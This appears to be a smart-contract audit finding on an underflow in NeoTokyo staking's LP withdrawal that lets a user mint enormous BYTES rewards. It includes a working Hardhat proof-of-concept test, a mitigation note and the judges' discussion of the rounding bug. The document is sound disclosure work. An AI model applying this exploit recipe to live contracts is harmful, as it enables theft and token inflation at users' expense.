[H-02] Underflow oflpPosition.pointsduring withdrawLP causes huge reward minting
Submitted byrokso, also found by0xnev,BPZ,Toshii,Josiah,ak1,ulqiorra,rbserver,juancito,juancito,minhquanym,auditor0517,auditor0517,Jeiwan,cccz,RaymondFam,rokso,MadWookie,kaden,0x52,carlitox477,DadeKuma,Krace,Haipls,Krace,UdarTeam,kenzo,DadeKuma,ABA,jekapi,J4de,anodaram,LegendFenGuin,aashar,nobody2018,Ruhum, andLirios
NeoTokyoStaking allows to stake and withdraw LPs. User can stake multiple times on same position which simply results in extended lock time and user can withdraw all of these LPs once lock time is passed.
There is a scenario when withdrawing LPs results in overflow oflpPosition.points. After withdraw if attacker callsgetRewards()then attacker will get more than 1e64 BYTES tokens as reward.
Proof of Concept
Affected code block:NeoTokyoStaker.sol#L1622-L1631
Affected line:L1627
From below POC, you can see that Alice is staking twice and some specific amounts which will trigger underflow when Alice withdraw LP. Once staked LPs are unlocked, Alice can withdraw her LPs and callgetReward()to trigger minting of more than 1e64 BYTES tokens.
Below test can be added inNeoTokyoStaker.test.jstest file.
it('Unexpected rewards minting due to underflow of "points"',asyncfunction() {// Configure the LP token contract address on the staker.awaitNTStaking.connect(owner.signer).configureLP(LPToken.address);constamount1=ethers.utils.parseEther('10.009')constamount2=ethers.utils.parseEther('11.009')constlockingDays=30// Alice stake amount1 LPs for 30 days.awaitNTStaking.connect(alice.signer).stake(ASSETS.LP.id,TIMELOCK_OPTION_IDS[lockingDays],amount1,0,0);// Alice stake amount2 LPs for 30 days.awaitNTStaking.connect(alice.signer).stake(ASSETS.LP.id,TIMELOCK_OPTION_IDS[lockingDays],amount2,0,0);constpriorBlockNumber=awaitethers.provider.getBlockNumber();constpriorBlock=awaitethers.provider.getBlock(priorBlockNumber);letaliceStakeTime=priorBlock.timestamp;// Bob stake 10 LPs for 30 daysawaitNTStaking.connect(bob.signer).stake(ASSETS.LP.id,TIMELOCK_OPTION_IDS[lockingDays],ethers.utils.parseEther('10'),0,0);// Set time to unlock staked lpawaitethers.provider.send('evm_setNextBlockTimestamp', [aliceStakeTime+ (60*60*24*lockingDays)]);// Alice withdraw LP// This transaction will cause underflow of `lpPosition.points`awaitNTStaking.connect(alice.signer).withdraw(ASSETS.LP.id,amount1.add(amount2));// Before exploit:: Verify Alice's Bytes balance is less than 10000 BYTESexpect(awaitNTBytes2_0.balanceOf(alice.address)).lt(ethers.utils.parseUnits('10000',18))// Get rewards for Alice. It will mint HUGE rewards due to underflow happened on withdraw transaction.awaitNTBytes2_0.getReward(alice.address)// After exploit:: Verify Alice's Bytes balance is greater than 3e64expect(awaitNTBytes2_0.balanceOf(alice.address)).gt(ethers.utils.parseUnits('3',64))});
Recommended Mitigation Steps
Consider adding proper precision forpointsandtotalPointsand also consider checking for under/overflows.
TimTinkers (Neo Tokyo) commented:
@hansfriese - this attack is a different way of abusing the same rounding bug from#348; duplicates?I agree with the severity of the underlying issue and really appreciate the test case demonstrating this.
hansfriese (judge) commented:
Totally, there are 3 kinds of rounding issues.Users can get infinite points by depositing5e15twice and withdrawing1e16. So0 * 2 - 1 = -1 = type(uint256).maxUsers can get free points by depositing 1e16 and withdrawing 5e15 twice. So1 - 0 * 2 = 1Users would lose some LP(or staking reward) due to the rounding.After discussing with other judges, I will merge 1 and 2 into one high and mark 3 as QA as it contains a lower impact.
TimTinkers (Neo Tokyo) confirmed